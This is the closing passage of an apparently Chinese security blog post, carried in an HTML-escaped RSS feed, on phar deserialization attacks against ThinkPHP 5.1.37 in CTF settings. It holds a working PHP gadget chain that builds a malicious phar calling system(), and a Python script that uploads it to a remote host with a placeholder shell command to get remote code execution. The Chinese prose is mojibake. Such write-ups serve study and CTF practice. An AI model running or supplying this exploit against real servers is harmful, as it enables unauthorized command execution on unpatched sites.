class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;data = [&lt;span class=&#34;string&#34;&gt;&amp;quot;ethan&amp;quot;&lt;/span&gt;=&amp;gt;&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Request&lt;/span&gt;()];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Request&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$hook&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$config&lt;/span&gt; = [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;var_method&amp;#x27;&lt;/span&gt;       =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;_method&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;var_ajax&amp;#x27;&lt;/span&gt;         =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;_ajax&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;var_pjax&amp;#x27;&lt;/span&gt;         =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;_pjax&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;var_pathinfo&amp;#x27;&lt;/span&gt;     =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;s&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;pathinfo_fetch&amp;#x27;&lt;/span&gt;   =&amp;gt; [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;#x27;ORIG_PATH_INFO&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;#x27;REDIRECT_PATH_INFO&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;#x27;REDIRECT_URL&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;default_filter&amp;#x27;&lt;/span&gt;   =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;url_domain_root&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;https_agent_name&amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;http_agent_ip&amp;#x27;&lt;/span&gt;    =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;HTTP_X_REAL_IP&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;url_html_suffix&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;html&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$param&lt;/span&gt; = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /y0u_f0und_It&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;filter = &lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;config = [&lt;span class=&#34;string&#34;&gt;&amp;quot;var_ajax&amp;quot;&lt;/span&gt;=&amp;gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;hook = [&lt;span class=&#34;string&#34;&gt;&amp;quot;visible&amp;quot;&lt;/span&gt;=&amp;gt;[&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;isAjax&amp;quot;&lt;/span&gt;]];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;process&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;pipes&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;model&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;concern&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;Conversion&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title&#34;&gt;model&lt;/span&gt;\&lt;span class=&#34;title&#34;&gt;Pivot&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Windows&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$files&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;files = [&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Pivot&lt;/span&gt;()];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;model&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;Model&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Pivot&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Model&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;process&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;pipes&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;Windows&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$w&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Windows&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;phar.phar&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;startBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setMetadata&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$w&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;addFromString&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;12345&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;stopBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æ‰§è¡Œåç”Ÿæˆpharï¼Œç„¶åæ‰§è¡Œè„šæœ¬&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; urllib.parse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;phar.phar&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = f.read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = urllib.parse.quote(base64.b64encode(s).decode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# print(s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remote = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;here_is_remote_ip&amp;gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sess =requests.session()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = sess.post(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = &lt;span class=&#34;string&#34;&gt;f&amp;#x27;http://&lt;span class=&#34;subst&#34;&gt;&amp;#123;remote&amp;#125;&lt;/span&gt;/index.php/index/index/hello&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    params=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;ethan&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;here_is_your_shell_command&amp;gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;world&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;f&amp;#x27;hello=&lt;span class=&#34;subst&#34;&gt;&amp;#123;s&amp;#125;&lt;/span&gt;&amp;amp;a=phar://./hello.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æˆåŠŸRCE&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;æ€»ç»“&#34;&gt;&lt;a href=&#34;#æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;æ€»ç»“&#34;&gt;&lt;/a&gt;æ€»ç»“&lt;/h2&gt;&lt;p&gt;pharååºåˆ—åŒ–æä¾›äº†ä¸€ç§æ‰©å±•ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢çš„æ–¹å¼ã€å…¥å£ï¼Œæ‰€ä»¥åŸºäºunserialize()å‡½æ•°çš„å„ç±»æ”»å‡»tricksï¼ˆæ¯”å¦‚å¼•ç”¨ç»•è¿‡ä¹‹ç±»çš„ï¼‰ä¾ç„¶é€‚ç”¨ã€‚é‰´äºpharååºåˆ—åŒ–æ¼æ´è®¾è®¡ç‰ˆæœ¬è¾ƒå¤šï¼Œç›¸ä¿¡CTFæ¯”èµ›ä¸­å®ƒä»ç„¶ä¼šç¨³å®šå‡ºåœºã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html&#34;&gt;Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.php.net/manual/zh/class.phar.php&#34;&gt;https://www.php.net/manual/zh/class.phar.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/lllffg/article/details/116145918&#34;&gt;Thinkphp 5.1.37ååºåˆ—åŒ–æ¼æ´&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf&#34;&gt;us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.dev/php/php-src&#34;&gt;https://github.dev/php/php-src&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.webhek.com/post/packaging-your-php-apps-with-phar.html&#34;&gt;packaging-your-php-apps-with-phar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/205943.html&#34;&gt;PHARååºåˆ—åŒ–æ‹“å±•æ“ä½œæ€»ç»“&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
